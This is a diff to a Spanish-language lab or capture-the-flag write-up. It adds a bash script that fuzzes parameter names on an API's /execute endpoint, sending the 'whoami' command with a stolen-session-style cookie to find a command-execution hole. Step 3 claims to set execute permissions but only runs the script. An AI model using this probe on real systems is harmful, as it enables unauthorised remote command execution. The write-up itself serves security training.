@@ -264,9 +264,30 @@ curl -X POST http://secure-api-register.dl/execute \
 | `"whoami"`                              | Es el valor que se está enviando. En este caso, **el comando a ejecutar** (Linux).                                                       |
 | `-b cookie.txt`                         | Usa la **cookie de sesión** previamente guardada (por ejemplo, con el login). Esto puede ser necesario si la API requiere autenticación. |
 
-Al ejecutar el comando obtenemos esta respuesta:
+Creamos un script para identificar una posible respuesta al comando whoami
 
-![image](https://github.com/user-attachments/assets/55fe3c1d-a02d-401c-9b5d-353f0d351505)
+## 1. Creamos un archivo 
+```bash
+nano param_fuzz.sh
+```
+## 2. Agregamos esta funcion
+
+```bash
+#!/bin/bash
+for key in cmd command exec run action; do
+  echo "[*] Probando parámetro: $key"
+  curl -s -X POST http://secure-api-register.dl/execute \
+    -H "Content-Type: application/json" \
+    -d "{\"$key\": \"whoami\"}" \
+    -b cookie.txt
+  echo -e "\n----------------------"
+done
+```
+
+## 3. Le damos permisos de ejecucion
+```bash
+./param_fuzz.sh
+```
 
 
 
